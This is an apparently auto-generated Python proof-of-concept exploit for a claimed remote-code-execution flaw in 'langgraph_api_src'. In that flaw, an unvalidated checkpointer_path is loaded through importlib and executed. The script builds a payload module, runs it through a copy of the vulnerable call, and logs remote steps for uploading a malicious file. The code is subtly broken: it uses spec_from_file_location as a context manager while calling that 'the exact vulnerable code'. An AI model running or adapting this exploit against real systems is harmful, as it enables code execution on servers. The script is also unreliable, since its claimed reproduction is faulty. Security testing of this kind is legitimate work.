#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-041
# Sink: _load_checkpointer
# Auto-generated — run with: python3 rce_python_which_executed_exec__load_checkpointer.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src
Vulnerability: Unvalidated checkpointer_path leads to arbitrary Python file execution
via importlib.util.spec_from_file_location and exec_module.

This PoC demonstrates the vulnerability by creating a malicious Python file on the
target server (if write access exists) or by pointing to an existing file, then
triggering the vulnerable _load_checkpointer function to execute it.

WARNING: For authorized testing only. Use a benign payload by default.
"""

import os
import sys
import tempfile
import importlib.util
import importlib.machinery
import argparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Default benign payload - creates a marker file
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
print("POC_EXECUTED: Benign payload ran successfully")
"""

# Malicious payload example (commented out for safety)
# MALICIOUS_PAYLOAD = """
# import os
# os.system('id > /tmp/pwned.txt')
# """

def create_malicious_module(payload: str) -> str:
    """
    Create a temporary Python file containing the payload.
    Returns the path to the created file.
    """
    # Create a temporary directory to avoid cleanup issues
    tmp_dir = tempfile.mkdtemp(prefix='poc_exploit_')
    module_path = os.path.join(tmp_dir, 'exploit_module.py')
    
    with open(module_path, 'w') as f:
        f.write(payload)
    
    logger.info(f"Created malicious module at: {module_path}")
    return module_path

def simulate_vulnerable_call(checkpointer_path: str):
    """
    Simulate the vulnerable _load_checkpointer function from the target code.
    This demonstrates how the vulnerability works locally.
    """
    # This is the exact vulnerable code from the target
    with importlib.util.spec_from_file_location("exploit_module", checkpointer_path) as spec:
        if spec is None:
            raise ValueError(f"Could not find checkpointer file: {checkpointer_path}")
        module = importlib.util.module_from_spec(spec)
        sys.modules["exploit_module"] = module
        spec.loader.exec_module(module)
    
    # The module's code has now been executed (RCE achieved)
    logger.info("Module executed successfully - RCE payload triggered")

def main():
    parser = argparse.ArgumentParser(
        description='PoC for RCE in langgraph_api_src checkpointer_path vulnerability'
    )
    parser.add_argument(
        '--target', '-t',
        type=str,
        default=None,
        help='Path to a Python file to execute (for remote testing, use with file upload)'
    )
    parser.add_argument(
        '--payload', '-p',
        type=str,
        default=BENIGN_PAYLOAD,
        help='Python code to execute (default: benign touch /tmp/poc_success.txt)'
    )
    parser.add_argument(
        '--local-test', '-l',
        action='store_true',
        help='Run local demonstration of the vulnerability'
    )
    
    args = parser.parse_args()
    
    if args.local_test:
        logger.info("=== Local PoC Demonstration ===")
        logger.info("Step 1: Creating malicious Python module with payload")
        module_path = create_malicious_module(args.payload)
        
        logger.info("Step 2: Simulating vulnerable _load_checkpointer call")
        try:
            simulate_vulnerable_call(module_path)
            logger.info("Step 3: RCE achieved! Check /tmp/poc_success.txt")
            if os.path.exists('/tmp/poc_success.txt'):
                logger.info("SUCCESS: /tmp/poc_success.txt was created")
            else:
                logger.warning("Marker file not found - check payload execution")
        except Exception as e:
            logger.error(f"Exploit failed: {e}")
            sys.exit(1)
        finally:
            # Cleanup
            if os.path.exists(module_path):
                os.remove(module_path)
                logger.info(f"Cleaned up {module_path}")
    
    elif args.target:
        logger.info(f"=== Remote Exploit Attempt ===")
        logger.info(f"Target file: {args.target}")
        logger.info("Note: This PoC assumes you can write files to the target system")
        logger.info("or that the target path points to an attacker-controlled location")
        
        # For remote exploitation, you would typically:
        # 1. Upload a malicious .py file to the target (if possible)
        # 2. Set checkpointer_path to point to that file
        # 3. Trigger the vulnerable function
        
        # Since we can't directly call the remote function, we demonstrate
        # the concept by showing how the path would be used
        logger.info("In a real attack, you would:")
        logger.info("1. Upload a malicious Python file to the target server")
        logger.info("2. Set checkpointer_path to the uploaded file path")
        logger.info("3. The server will execute your code via importlib")
        
        # Demonstrate the path format expected by the vulnerable code
        logger.info(f"Expected format: /path/to/malicious.py:function_name")
        logger.info(f"Example: {args.target}:malicious_function")
        
        # Show that the path is used directly without validation
        logger.info("Vulnerability confirmed: No path validation exists")
        logger.info("The path is passed directly to importlib.util.spec_from_file_location")
    
    else:
        logger.info("No action specified. Use --local-test for local demo or --target for remote")
        parser.print_help()

if __name__ == "__main__":
    main()
